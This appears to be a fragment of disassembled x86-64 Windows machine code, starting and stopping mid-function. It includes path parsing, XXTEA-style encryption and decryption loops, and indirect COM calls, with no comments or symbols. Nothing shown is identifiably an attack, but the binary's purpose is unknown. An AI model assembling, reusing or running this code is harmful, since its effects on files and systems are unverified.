  406350:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
  406354:	48 89 f2             	mov    %rsi,%rdx
  406357:	48 8d b5 80 fc ff ff 	lea    -0x380(%rbp),%rsi
  40635e:	e8 dc 1a 00 00       	call   0x407e3f
  406363:	ba 18 00 00 00       	mov    $0x18,%edx
  406368:	48 89 f1             	mov    %rsi,%rcx
  40636b:	48 89 c3             	mov    %rax,%rbx
  40636e:	e8 d9 dd ff ff       	call   0x40414c
  406373:	31 d2                	xor    %edx,%edx
  406375:	48 89 f1             	mov    %rsi,%rcx
  406378:	e8 fc ef ff ff       	call   0x405379
  40637d:	48 8d 4e 08          	lea    0x8(%rsi),%rcx
  406381:	31 d2                	xor    %edx,%edx
  406383:	e8 f1 ef ff ff       	call   0x405379
  406388:	48 8d 4e 10          	lea    0x10(%rsi),%rcx
  40638c:	31 d2                	xor    %edx,%edx
  40638e:	e8 e6 ef ff ff       	call   0x405379
  406393:	48 85 db             	test   %rbx,%rbx
  406396:	0f 84 da 00 00 00    	je     0x406476
  40639c:	48 8b 03             	mov    (%rbx),%rax
  40639f:	31 ff                	xor    %edi,%edi
  4063a1:	48 8d 50 ff          	lea    -0x1(%rax),%rdx
  4063a5:	48 89 d6             	mov    %rdx,%rsi
  4063a8:	48 85 f6             	test   %rsi,%rsi
  4063ab:	0f 88 c5 00 00 00    	js     0x406476
  4063b1:	8a 44 33 10          	mov    0x10(%rbx,%rsi,1),%al
  4063b5:	3c 5c                	cmp    $0x5c,%al
  4063b7:	74 04                	je     0x4063bd
  4063b9:	3c 2f                	cmp    $0x2f,%al
  4063bb:	75 0c                	jne    0x4063c9
  4063bd:	3c 5c                	cmp    $0x5c,%al
  4063bf:	74 0f                	je     0x4063d0
  4063c1:	31 d2                	xor    %edx,%edx
  4063c3:	3c 2f                	cmp    $0x2f,%al
  4063c5:	75 36                	jne    0x4063fd
  4063c7:	eb 07                	jmp    0x4063d0
  4063c9:	48 85 f6             	test   %rsi,%rsi
  4063cc:	75 7d                	jne    0x40644b
  4063ce:	eb ed                	jmp    0x4063bd
  4063d0:	48 85 f6             	test   %rsi,%rsi
  4063d3:	b8 00 00 00 00       	mov    $0x0,%eax
  4063d8:	48 89 d9             	mov    %rbx,%rcx
  4063db:	4c 8d 46 ff          	lea    -0x1(%rsi),%r8
  4063df:	4c 0f 44 c0          	cmove  %rax,%r8
  4063e3:	31 d2                	xor    %edx,%edx
  4063e5:	e8 79 27 00 00       	call   0x408b63
  4063ea:	48 8d 8d 80 fc ff ff 	lea    -0x380(%rbp),%rcx
  4063f1:	48 89 c2             	mov    %rax,%rdx
  4063f4:	e8 80 ef ff ff       	call   0x405379
  4063f9:	48 8d 56 01          	lea    0x1(%rsi),%rdx
  4063fd:	48 39 f7             	cmp    %rsi,%rdi
  406400:	7e 30                	jle    0x406432
  406402:	4c 8d 47 ff          	lea    -0x1(%rdi),%r8
  406406:	48 89 d9             	mov    %rbx,%rcx
  406409:	e8 55 27 00 00       	call   0x408b63
  40640e:	48 8d b5 80 fc ff ff 	lea    -0x380(%rbp),%rsi
  406415:	48 8d 4e 08          	lea    0x8(%rsi),%rcx
  406419:	48 89 c2             	mov    %rax,%rdx
  40641c:	e8 58 ef ff ff       	call   0x405379
  406421:	48 89 d9             	mov    %rbx,%rcx
  406424:	48 89 fa             	mov    %rdi,%rdx
  406427:	e8 a0 27 00 00       	call   0x408bcc
  40642c:	48 8d 4e 10          	lea    0x10(%rsi),%rcx
  406430:	eb 0f                	jmp    0x406441
  406432:	48 89 d9             	mov    %rbx,%rcx
  406435:	e8 92 27 00 00       	call   0x408bcc
  40643a:	48 8d 8d 88 fc ff ff 	lea    -0x378(%rbp),%rcx
  406441:	48 89 c2             	mov    %rax,%rdx
  406444:	e8 30 ef ff ff       	call   0x405379
  406449:	eb 2b                	jmp    0x406476
  40644b:	3c 2e                	cmp    $0x2e,%al
  40644d:	75 1f                	jne    0x40646e
  40644f:	48 39 f2             	cmp    %rsi,%rdx
  406452:	7e 1a                	jle    0x40646e
  406454:	8a 44 33 0f          	mov    0xf(%rbx,%rsi,1),%al
  406458:	3c 5c                	cmp    $0x5c,%al
  40645a:	74 12                	je     0x40646e
  40645c:	3c 2f                	cmp    $0x2f,%al
  40645e:	74 0e                	je     0x40646e
  406460:	80 7c 33 11 2e       	cmpb   $0x2e,0x11(%rbx,%rsi,1)
  406465:	74 07                	je     0x40646e
  406467:	48 85 ff             	test   %rdi,%rdi
  40646a:	48 0f 44 fe          	cmove  %rsi,%rdi
  40646e:	48 ff ce             	dec    %rsi
  406471:	e9 32 ff ff ff       	jmp    0x4063a8
  406476:	48 8b 85 80 fc ff ff 	mov    -0x380(%rbp),%rax
  40647d:	45 31 ed             	xor    %r13d,%r13d
  406480:	48 8b b5 90 fc ff ff 	mov    -0x370(%rbp),%rsi
  406487:	4c 8d 35 52 fa 00 00 	lea    0xfa52(%rip),%r14        # 0x415ee0
  40648e:	48 8d 3d 53 fa 00 00 	lea    0xfa53(%rip),%rdi        # 0x415ee8
  406495:	4c 8d 25 54 fa 00 00 	lea    0xfa54(%rip),%r12        # 0x415ef0
  40649c:	48 89 85 18 fc ff ff 	mov    %rax,-0x3e8(%rbp)
  4064a3:	48 8b 85 88 fc ff ff 	mov    -0x378(%rbp),%rax
  4064aa:	48 89 85 10 fc ff ff 	mov    %rax,-0x3f0(%rbp)
  4064b1:	4b 8b 0c 2e          	mov    (%r14,%r13,1),%rcx
  4064b5:	e8 23 27 00 00       	call   0x408bdd
  4064ba:	42 8a 14 2f          	mov    (%rdi,%r13,1),%dl
  4064be:	48 89 f1             	mov    %rsi,%rcx
  4064c1:	88 95 27 fc ff ff    	mov    %dl,-0x3d9(%rbp)
  4064c7:	4b 8b 14 2c          	mov    (%r12,%r13,1),%rdx
  4064cb:	48 89 95 08 fc ff ff 	mov    %rdx,-0x3f8(%rbp)
  4064d2:	48 89 c2             	mov    %rax,%rdx
  4064d5:	e8 f0 fa ff ff       	call   0x405fca
  4064da:	84 c0                	test   %al,%al
  4064dc:	0f 84 52 04 00 00    	je     0x406934
  4064e2:	48 89 d9             	mov    %rbx,%rcx
  4064e5:	e8 6d bb ff ff       	call   0x402057
  4064ea:	48 85 c0             	test   %rax,%rax
  4064ed:	0f 84 32 01 00 00    	je     0x406625
  4064f3:	48 83 38 00          	cmpq   $0x0,(%rax)
  4064f7:	0f 84 26 01 00 00    	je     0x406623
  4064fd:	ba 01 00 00 00       	mov    $0x1,%edx
  406502:	48 89 c1             	mov    %rax,%rcx
  406505:	e8 a7 f9 ff ff       	call   0x405eb1
  40650a:	48 89 c6             	mov    %rax,%rsi
  40650d:	e8 1f 0d 00 00       	call   0x407231
  406512:	31 d2                	xor    %edx,%edx
  406514:	48 89 c1             	mov    %rax,%rcx
  406517:	e8 95 f9 ff ff       	call   0x405eb1
  40651c:	48 85 f6             	test   %rsi,%rsi
  40651f:	48 c7 85 58 fc ff ff 	movq   $0x0,-0x3a8(%rbp)
  406526:	00 00 00 00 
  40652a:	49 89 c6             	mov    %rax,%r14
  40652d:	74 09                	je     0x406538
  40652f:	48 8b 0e             	mov    (%rsi),%rcx
  406532:	48 83 f9 01          	cmp    $0x1,%rcx
  406536:	7f 29                	jg     0x406561
  406538:	4c 8b 05 71 10 01 00 	mov    0x11071(%rip),%r8        # 0x4175b0
  40653f:	48 8d 8d 58 fc ff ff 	lea    -0x3a8(%rbp),%rcx
  406546:	48 89 f2             	mov    %rsi,%rdx
  406549:	e8 75 29 00 00       	call   0x408ec3
  40654e:	48 8b 8d 58 fc ff ff 	mov    -0x3a8(%rbp),%rcx
  406555:	31 d2                	xor    %edx,%edx
  406557:	e8 e2 f9 ff ff       	call   0x405f3e
  40655c:	e9 c4 00 00 00       	jmp    0x406625
  406561:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
  406565:	45 31 e4             	xor    %r12d,%r12d
  406568:	49 83 c6 10          	add    $0x10,%r14
  40656c:	4c 8d 3c 8e          	lea    (%rsi,%rcx,4),%r15
  406570:	48 89 85 f0 fb ff ff 	mov    %rax,-0x410(%rbp)
  406577:	b8 34 00 00 00       	mov    $0x34,%eax
  40657c:	45 8b 47 0c          	mov    0xc(%r15),%r8d
  406580:	48 99                	cqto
  406582:	48 f7 f9             	idiv   %rcx
  406585:	48 8d 78 06          	lea    0x6(%rax),%rdi
  406589:	48 8d 41 fe          	lea    -0x2(%rcx),%rax
  40658d:	48 89 85 e8 fb ff ff 	mov    %rax,-0x418(%rbp)
  406594:	41 81 ec 47 86 c8 61 	sub    $0x61c88647,%r12d
  40659b:	48 ff cf             	dec    %rdi
  40659e:	45 31 c9             	xor    %r9d,%r9d
  4065a1:	45 89 e5             	mov    %r12d,%r13d
  4065a4:	41 c1 ed 02          	shr    $0x2,%r13d
  4065a8:	41 83 e5 03          	and    $0x3,%r13d
  4065ac:	4d 8d 51 01          	lea    0x1(%r9),%r10
  4065b0:	44 89 e1             	mov    %r12d,%ecx
  4065b3:	42 8b 54 96 10       	mov    0x10(%rsi,%r10,4),%edx
  4065b8:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
  4065bd:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
  4065c2:	4c 89 95 c8 fb ff ff 	mov    %r10,-0x438(%rbp)
  4065c9:	e8 bb 0c 00 00       	call   0x407289
  4065ce:	4c 8b 95 c8 fb ff ff 	mov    -0x438(%rbp),%r10
  4065d5:	42 03 44 96 0c       	add    0xc(%rsi,%r10,4),%eax
  4065da:	4d 89 d1             	mov    %r10,%r9
  4065dd:	4c 39 95 e8 fb ff ff 	cmp    %r10,-0x418(%rbp)
  4065e4:	41 89 c0             	mov    %eax,%r8d
  4065e7:	42 89 44 96 0c       	mov    %eax,0xc(%rsi,%r10,4)
  4065ec:	7d be                	jge    0x4065ac
  4065ee:	8b 56 10             	mov    0x10(%rsi),%edx
  4065f1:	44 89 e1             	mov    %r12d,%ecx
  4065f4:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
  4065f9:	4c 8b 8d f0 fb ff ff 	mov    -0x410(%rbp),%r9
  406600:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
  406605:	e8 7f 0c 00 00       	call   0x407289
  40660a:	41 03 47 0c          	add    0xc(%r15),%eax
  40660e:	48 85 ff             	test   %rdi,%rdi
  406611:	41 89 c0             	mov    %eax,%r8d
  406614:	41 89 47 0c          	mov    %eax,0xc(%r15)
  406618:	0f 85 76 ff ff ff    	jne    0x406594
  40661e:	e9 15 ff ff ff       	jmp    0x406538
  406623:	31 c0                	xor    %eax,%eax
  406625:	48 89 c2             	mov    %rax,%rdx
  406628:	48 89 d9             	mov    %rbx,%rcx
  40662b:	e8 a9 be ff ff       	call   0x4024d9
  406630:	48 89 d9             	mov    %rbx,%rcx
  406633:	e8 1f ba ff ff       	call   0x402057
  406638:	48 85 c0             	test   %rax,%rax
  40663b:	0f 84 fe 00 00 00    	je     0x40673f
  406641:	48 83 38 00          	cmpq   $0x0,(%rax)
  406645:	0f 84 f2 00 00 00    	je     0x40673d
  40664b:	31 d2                	xor    %edx,%edx
  40664d:	48 89 c1             	mov    %rax,%rcx
  406650:	e8 5c f8 ff ff       	call   0x405eb1
  406655:	48 89 c6             	mov    %rax,%rsi
  406658:	e8 d4 0b 00 00       	call   0x407231
  40665d:	31 d2                	xor    %edx,%edx
  40665f:	48 89 c1             	mov    %rax,%rcx
  406662:	e8 4a f8 ff ff       	call   0x405eb1
  406667:	48 85 f6             	test   %rsi,%rsi
  40666a:	48 c7 85 68 fc ff ff 	movq   $0x0,-0x398(%rbp)
  406671:	00 00 00 00 
  406675:	49 89 c4             	mov    %rax,%r12
  406678:	74 09                	je     0x406683
  40667a:	48 8b 3e             	mov    (%rsi),%rdi
  40667d:	48 83 ff 01          	cmp    $0x1,%rdi
  406681:	7f 2c                	jg     0x4066af
  406683:	4c 8b 05 26 0f 01 00 	mov    0x10f26(%rip),%r8        # 0x4175b0
  40668a:	48 8d 8d 68 fc ff ff 	lea    -0x398(%rbp),%rcx
  406691:	48 89 f2             	mov    %rsi,%rdx
  406694:	e8 2a 28 00 00       	call   0x408ec3
  406699:	48 8b 8d 68 fc ff ff 	mov    -0x398(%rbp),%rcx
  4066a0:	ba 01 00 00 00       	mov    $0x1,%edx
  4066a5:	e8 94 f8 ff ff       	call   0x405f3e
  4066aa:	e9 90 00 00 00       	jmp    0x40673f
  4066af:	8b 4e 10             	mov    0x10(%rsi),%ecx
  4066b2:	4c 8d 6f ff          	lea    -0x1(%rdi),%r13
  4066b6:	b8 34 00 00 00       	mov    $0x34,%eax
  4066bb:	49 83 c4 10          	add    $0x10,%r12
  4066bf:	48 99                	cqto
  4066c1:	48 f7 ff             	idiv   %rdi
  4066c4:	69 c0 b9 79 37 9e    	imul   $0x9e3779b9,%eax,%eax
  4066ca:	48 83 c7 03          	add    $0x3,%rdi
  4066ce:	8d 98 56 da 4c b5    	lea    -0x4ab325aa(%rax),%ebx
  4066d4:	85 db                	test   %ebx,%ebx
  4066d6:	74 ab                	je     0x406683
  4066d8:	41 89 de             	mov    %ebx,%r14d
  4066db:	4d 89 e9             	mov    %r13,%r9
  4066de:	41 c1 ee 02          	shr    $0x2,%r14d
  4066e2:	41 83 e6 03          	and    $0x3,%r14d
  4066e6:	4d 8d 79 ff          	lea    -0x1(%r9),%r15
  4066ea:	89 ca                	mov    %ecx,%edx
  4066ec:	89 d9                	mov    %ebx,%ecx
  4066ee:	46 8b 44 be 10       	mov    0x10(%rsi,%r15,4),%r8d
  4066f3:	4c 89 64 24 28       	mov    %r12,0x28(%rsp)
  4066f8:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
  4066fd:	e8 87 0b 00 00       	call   0x407289
  406702:	42 8b 4c be 14       	mov    0x14(%rsi,%r15,4),%ecx
  406707:	4d 89 f9             	mov    %r15,%r9
  40670a:	29 c1                	sub    %eax,%ecx
  40670c:	4d 85 ff             	test   %r15,%r15
  40670f:	42 89 4c be 14       	mov    %ecx,0x14(%rsi,%r15,4)
  406714:	75 d0                	jne    0x4066e6
  406716:	44 8b 04 be          	mov    (%rsi,%rdi,4),%r8d
  40671a:	89 ca                	mov    %ecx,%edx
  40671c:	4c 89 64 24 28       	mov    %r12,0x28(%rsp)
  406721:	89 d9                	mov    %ebx,%ecx
  406723:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
  406728:	81 c3 47 86 c8 61    	add    $0x61c88647,%ebx
  40672e:	e8 56 0b 00 00       	call   0x407289
  406733:	8b 4e 10             	mov    0x10(%rsi),%ecx
  406736:	29 c1                	sub    %eax,%ecx
  406738:	89 4e 10             	mov    %ecx,0x10(%rsi)
  40673b:	eb 97                	jmp    0x4066d4
  40673d:	31 c0                	xor    %eax,%eax
  40673f:	48 8d 9d 60 fc ff ff 	lea    -0x3a0(%rbp),%rbx
  406746:	ba 08 00 00 00       	mov    $0x8,%edx
  40674b:	48 89 85 c0 fb ff ff 	mov    %rax,-0x440(%rbp)
  406752:	48 89 d9             	mov    %rbx,%rcx
  406755:	e8 f2 d9 ff ff       	call   0x40414c
  40675a:	48 8b 85 c0 fb ff ff 	mov    -0x440(%rbp),%rax
  406761:	48 89 c1             	mov    %rax,%rcx
  406764:	e8 74 24 00 00       	call   0x408bdd
  406769:	48 89 d9             	mov    %rbx,%rcx
  40676c:	48 89 85 60 fc ff ff 	mov    %rax,-0x3a0(%rbp)
  406773:	e8 43 06 00 00       	call   0x406dbb
  406778:	80 bd 27 fc ff ff 01 	cmpb   $0x1,-0x3d9(%rbp)
  40677f:	74 1d                	je     0x40679e
  406781:	72 12                	jb     0x406795
  406783:	80 bd 27 fc ff ff 02 	cmpb   $0x2,-0x3d9(%rbp)
  40678a:	75 2a                	jne    0x4067b6
  40678c:	48 8d 15 ed f6 00 00 	lea    0xf6ed(%rip),%rdx        # 0x415e80
  406793:	eb 10                	jmp    0x4067a5
  406795:	48 8d 15 24 f7 00 00 	lea    0xf724(%rip),%rdx        # 0x415ec0
  40679c:	eb 07                	jmp    0x4067a5
  40679e:	48 8d 15 fb f6 00 00 	lea    0xf6fb(%rip),%rdx        # 0x415ea0
  4067a5:	48 8b 8d 38 fc ff ff 	mov    -0x3c8(%rbp),%rcx
  4067ac:	e8 8e 16 00 00       	call   0x407e3f
  4067b1:	48 89 c3             	mov    %rax,%rbx
  4067b4:	eb 02                	jmp    0x4067b8
  4067b6:	31 db                	xor    %ebx,%ebx
  4067b8:	48 8b 8d 18 fc ff ff 	mov    -0x3e8(%rbp),%rcx
  4067bf:	48 8b 95 10 fc ff ff 	mov    -0x3f0(%rbp),%rdx
  4067c6:	e8 74 16 00 00       	call   0x407e3f
  4067cb:	b9 04 00 00 00       	mov    $0x4,%ecx
  4067d0:	48 85 c0             	test   %rax,%rax
  4067d3:	48 89 c7             	mov    %rax,%rdi
  4067d6:	74 07                	je     0x4067df
  4067d8:	48 8b 00             	mov    (%rax),%rax
  4067db:	48 8d 48 04          	lea    0x4(%rax),%rcx
  4067df:	e8 9c ea ff ff       	call   0x405280
  4067e4:	48 89 fa             	mov    %rdi,%rdx
  4067e7:	48 89 c6             	mov    %rax,%rsi
  4067ea:	48 89 c1             	mov    %rax,%rcx
  4067ed:	e8 35 f8 ff ff       	call   0x406027
  4067f2:	48 8d 15 67 f6 00 00 	lea    0xf667(%rip),%rdx        # 0x415e60
  4067f9:	48 89 f1             	mov    %rsi,%rcx
  4067fc:	e8 26 f8 ff ff       	call   0x406027
  406801:	48 8d 85 70 fc ff ff 	lea    -0x390(%rbp),%rax
  406808:	31 d2                	xor    %edx,%edx
  40680a:	41 b8 04 00 00 00    	mov    $0x4,%r8d
  406810:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  406815:	48 8b 05 84 0b 01 00 	mov    0x10b84(%rip),%rax        # 0x4173a0
  40681c:	4c 8d 0d 1d f6 00 00 	lea    0xf61d(%rip),%r9        # 0x415e40
  406823:	48 8d 0d 26 f6 00 00 	lea    0xf626(%rip),%rcx        # 0x415e50
  40682a:	48 c7 85 70 fc ff ff 	movq   $0x0,-0x390(%rbp)
  406831:	00 00 00 00 
  406835:	48 c7 85 78 fc ff ff 	movq   $0x0,-0x388(%rbp)
  40683c:	00 00 00 00 
  406840:	ff 10                	call   *(%rax)
  406842:	48 8b 8d 70 fc ff ff 	mov    -0x390(%rbp),%rcx
  406849:	4c 8d 85 78 fc ff ff 	lea    -0x388(%rbp),%r8
  406850:	48 8d 15 d9 f5 00 00 	lea    0xf5d9(%rip),%rdx        # 0x415e30
  406857:	48 8b 01             	mov    (%rcx),%rax
  40685a:	ff 10                	call   *(%rax)
  40685c:	48 8d 0d 9d f5 00 00 	lea    0xf59d(%rip),%rcx        # 0x415e00
  406863:	e8 40 c2 ff ff       	call   0x402aa8
  406868:	48 8b 8d 70 fc ff ff 	mov    -0x390(%rbp),%rcx
  40686f:	48 89 c2             	mov    %rax,%rdx
  406872:	4c 8b 01             	mov    (%rcx),%r8
  406875:	41 ff 90 a0 00 00 00 	call   *0xa0(%r8)
  40687c:	48 83 7d 48 00       	cmpq   $0x0,0x48(%rbp)
  406881:	b9 03 00 00 00       	mov    $0x3,%ecx
  406886:	74 12                	je     0x40689a
  406888:	48 8b 45 48          	mov    0x48(%rbp),%rax
  40688c:	48 8b 00             	mov    (%rax),%rax
  40688f:	48 89 85 e0 fb ff ff 	mov    %rax,-0x420(%rbp)
  406896:	48 8d 48 03          	lea    0x3(%rax),%rcx
  40689a:	e8 e1 e9 ff ff       	call   0x405280
  40689f:	48 8d 15 3a f5 00 00 	lea    0xf53a(%rip),%rdx        # 0x415de0
  4068a6:	48 89 c1             	mov    %rax,%rcx
  4068a9:	48 89 c7             	mov    %rax,%rdi
  4068ac:	e8 76 f7 ff ff       	call   0x406027
  4068b1:	48 8b 55 48          	mov    0x48(%rbp),%rdx
  4068b5:	48 89 f9             	mov    %rdi,%rcx
  4068b8:	e8 6a f7 ff ff       	call   0x406027
  4068bd:	48 89 f9             	mov    %rdi,%rcx
  4068c0:	e8 e3 c1 ff ff       	call   0x402aa8
  4068c5:	48 8b 8d 70 fc ff ff 	mov    -0x390(%rbp),%rcx
  4068cc:	48 89 c2             	mov    %rax,%rdx
  4068cf:	4c 8b 01             	mov    (%rcx),%r8
  4068d2:	41 ff 50 58          	call   *0x58(%r8)
  4068d6:	48 89 d9             	mov    %rbx,%rcx
  4068d9:	e8 ca c1 ff ff       	call   0x402aa8
  4068de:	48 8b 8d 70 fc ff ff 	mov    -0x390(%rbp),%rcx
  4068e5:	44 8b 85 08 fc ff ff 	mov    -0x3f8(%rbp),%r8d
  4068ec:	48 89 c2             	mov    %rax,%rdx
  4068ef:	4c 8b 09             	mov    (%rcx),%r9
  4068f2:	41 ff 91 88 00 00 00 	call   *0x88(%r9)
  4068f9:	48 8b 8d 70 fc ff ff 	mov    -0x390(%rbp),%rcx
  406900:	48 8b 01             	mov    (%rcx),%rax
  406903:	ff 50 10             	call   *0x10(%rax)
  406906:	48 89 f1             	mov    %rsi,%rcx
  406909:	e8 9a c1 ff ff       	call   0x402aa8
  40690e:	48 8b 8d 78 fc ff ff 	mov    -0x388(%rbp),%rcx
  406915:	41 b8 01 00 00 00    	mov    $0x1,%r8d
  40691b:	48 89 c2             	mov    %rax,%rdx
  40691e:	4c 8b 09             	mov    (%rcx),%r9
  406921:	41 ff 51 30          	call   *0x30(%r9)
  406925:	48 8b 8d 78 fc ff ff 	mov    -0x388(%rbp),%rcx
  40692c:	48 8b 01             	mov    (%rcx),%rax
  40692f:	ff 50 10             	call   *0x10(%rax)
  406932:	eb 11                	jmp    0x406945
  406934:	49 83 c5 18          	add    $0x18,%r13
  406938:	49 81 fd 88 08 00 00 	cmp    $0x888,%r13
  40693f:	0f 85 6c fb ff ff    	jne    0x4064b1
  406945:	48 8b 05 d4 07 01 00 	mov    0x107d4(%rip),%rax        # 0x417120
  40694c:	48 8b 95 40 fc ff ff 	mov    -0x3c0(%rbp),%rdx
  406953:	48 8b 8d 30 fc ff ff 	mov    -0x3d0(%rbp),%rcx
  40695a:	ff 10                	call   *(%rax)
  40695c:	85 c0                	test   %eax,%eax
  40695e:	0f 85 1e f9 ff ff    	jne    0x406282
  406964:	48 8b 05 65 07 01 00 	mov    0x10765(%rip),%rax        # 0x4170d0
  40696b:	ff 10                	call   *(%rax)
  40696d:	83 f8 12             	cmp    $0x12,%eax
  406970:	74 0e                	je     0x406980
  406972:	31 d2                	xor    %edx,%edx
  406974:	89 c1                	mov    %eax,%ecx
  406976:	e8 25 17 00 00       	call   0x4080a0
  40697b:	e9 02 f9 ff ff       	jmp    0x406282
  406980:	e8 2c f6 ff ff       	call   0x405fb1
  406985:	48 8b 05 a4 07 01 00 	mov    0x107a4(%rip),%rax        # 0x417130
  40698c:	48 8b 8d 30 fc ff ff 	mov    -0x3d0(%rbp),%rcx
  406993:	ff 10                	call   *(%rax)
  406995:	48 83 bd a0 fc ff ff 	cmpq   $0x0,-0x360(%rbp)
  40699c:	00 
  40699d:	0f 84 22 f7 ff ff    	je     0x4060c5
  4069a3:	e8 d4 26 00 00       	call   0x40907c
  4069a8:	90                   	nop
  4069a9:	48 81 c4 78 04 00 00 	add    $0x478,%rsp
  4069b0:	5b                   	pop    %rbx
  4069b1:	5e                   	pop    %rsi
  4069b2:	5f                   	pop    %rdi
  4069b3:	41 5c                	pop    %r12
  4069b5:	41 5d                	pop    %r13
  4069b7:	41 5e                	pop    %r14
  4069b9:	41 5f                	pop    %r15
  4069bb:	5d                   	pop    %rbp
  4069bc:	c3                   	ret
  4069bd:	41 57                	push   %r15
  4069bf:	41 56                	push   %r14
  4069c1:	41 55                	push   %r13
  4069c3:	41 54                	push   %r12
  4069c5:	55                   	push   %rbp
  4069c6:	57                   	push   %rdi
  4069c7:	56                   	push   %rsi
  4069c8:	53                   	push   %rbx
  4069c9:	48 81 ec 98 00 00 00 	sub    $0x98,%rsp
  4069d0:	48 8d 0d e9 f3 00 00 	lea    0xf3e9(%rip),%rcx        # 0x415dc0
  4069d7:	31 ff                	xor    %edi,%edi
  4069d9:	45 31 e4             	xor    %r12d,%r12d
  4069dc:	e8 87 0b 00 00       	call   0x407568
  4069e1:	48 8d 0d b8 f3 00 00 	lea    0xf3b8(%rip),%rcx        # 0x415da0
  4069e8:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
  4069ed:	4c 8d 74 24 60       	lea    0x60(%rsp),%r14
  4069f2:	e8 71 0b 00 00       	call   0x407568
  4069f7:	48 8b 0d 02 0d 01 00 	mov    0x10d02(%rip),%rcx        # 0x417700
  4069fe:	ba 1b 00 00 00       	mov    $0x1b,%edx
  406a03:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
  406a08:	e8 e9 f3 ff ff       	call   0x405df6
  406a0d:	ba 10 00 00 00       	mov    $0x10,%edx
  406a12:	4c 89 f1             	mov    %r14,%rcx
  406a15:	48 89 c6             	mov    %rax,%rsi
  406a18:	e8 2f d7 ff ff       	call   0x40414c
  406a1d:	48 8d 05 3c f3 00 00 	lea    0xf33c(%rip),%rax        # 0x415d60
  406a24:	4c 8b 05 a5 0c 01 00 	mov    0x10ca5(%rip),%r8        # 0x4176d0
  406a2b:	8a 04 38             	mov    (%rax,%rdi,1),%al
  406a2e:	49 8d 4e 08          	lea    0x8(%r14),%rcx
  406a32:	88 44 24 60          	mov    %al,0x60(%rsp)
  406a36:	48 8d 05 2b f3 00 00 	lea    0xf32b(%rip),%rax        # 0x415d68
  406a3d:	48 8b 14 38          	mov    (%rax,%rdi,1),%rdx
  406a41:	e8 7d 24 00 00       	call   0x408ec3
  406a46:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
  406a4b:	48 85 c0             	test   %rax,%rax
  406a4e:	0f 84 ad 01 00 00    	je     0x406c01
  406a54:	4c 8b 28             	mov    (%rax),%r13
  406a57:	49 6b c4 38          	imul   $0x38,%r12,%rax
  406a5b:	31 ed                	xor    %ebp,%ebp
  406a5d:	48 8d 5c 06 10       	lea    0x10(%rsi,%rax,1),%rbx
  406a62:	4c 39 ed             	cmp    %r13,%rbp
  406a65:	7c 14                	jl     0x406a7b
  406a67:	4d 85 ed             	test   %r13,%r13
  406a6a:	b8 00 00 00 00       	mov    $0x0,%eax
  406a6f:	4c 0f 48 e8          	cmovs  %rax,%r13
  406a73:	4d 01 ec             	add    %r13,%r12
  406a76:	e9 86 01 00 00       	jmp    0x406c01
  406a7b:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
  406a80:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
  406a85:	ba 20 00 00 00       	mov    $0x20,%edx
  406a8a:	4c 8b 7c e8 10       	mov    0x10(%rax,%rbp,8),%r15
  406a8f:	e8 b8 d6 ff ff       	call   0x40414c
  406a94:	8a 44 24 60          	mov    0x60(%rsp),%al
  406a98:	4c 89 f9             	mov    %r15,%rcx
  406a9b:	88 44 24 70          	mov    %al,0x70(%rsp)
  406a9f:	e8 39 21 00 00       	call   0x408bdd
  406aa4:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
  406aa9:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
  406aae:	e8 2a 21 00 00       	call   0x408bdd
  406ab3:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
  406ab8:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
  406abf:	00 
  406ac0:	e8 18 21 00 00       	call   0x408bdd
  406ac5:	48 89 84 24 88 00 00 	mov    %rax,0x88(%rsp)
  406acc:	00 
  406acd:	e8 56 03 00 00       	call   0x406e28
  406ad2:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
  406ad7:	48 89 03             	mov    %rax,(%rbx)
  406ada:	8a 44 24 70          	mov    0x70(%rsp),%al
  406ade:	88 43 18             	mov    %al,0x18(%rbx)
  406ae1:	e8 f7 20 00 00       	call   0x408bdd
  406ae6:	48 8d 4b 20          	lea    0x20(%rbx),%rcx
  406aea:	48 89 c2             	mov    %rax,%rdx
  406aed:	e8 87 e8 ff ff       	call   0x405379
  406af2:	48 8b 8c 24 80 00 00 	mov    0x80(%rsp),%rcx
  406af9:	00 
  406afa:	e8 de 20 00 00       	call   0x408bdd
  406aff:	48 8d 4b 28          	lea    0x28(%rbx),%rcx
  406b03:	48 89 c2             	mov    %rax,%rdx
  406b06:	e8 6e e8 ff ff       	call   0x405379
  406b0b:	48 8b 8c 24 88 00 00 	mov    0x88(%rsp),%rcx
  406b12:	00 
  406b13:	e8 c5 20 00 00       	call   0x408bdd
  406b18:	48 8d 4b 30          	lea    0x30(%rbx),%rcx
  406b1c:	48 89 c2             	mov    %rax,%rdx
  406b1f:	e8 55 e8 ff ff       	call   0x405379
  406b24:	31 c9                	xor    %ecx,%ecx
  406b26:	49 89 d9             	mov    %rbx,%r9
  406b29:	ba 00 f0 1f 00       	mov    $0x1ff000,%edx
  406b2e:	48 8b 05 bb 0e 01 00 	mov    0x10ebb(%rip),%rax        # 0x4179f0
  406b35:	4c 8d 05 06 17 00 00 	lea    0x1706(%rip),%r8        # 0x408242
  406b3c:	48 89 43 10          	mov    %rax,0x10(%rbx)
  406b40:	48 8d 44 24 5c       	lea    0x5c(%rsp),%rax
  406b45:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  406b4a:	48 8b 05 5f 05 01 00 	mov    0x1055f(%rip),%rax        # 0x4170b0
  406b51:	c7 44 24 5c 00 00 00 	movl   $0x0,0x5c(%rsp)
  406b58:	00 
  406b59:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%rsp)
  406b60:	00 
  406b61:	ff 10                	call   *(%rax)
  406b63:	48 85 c0             	test   %rax,%rax
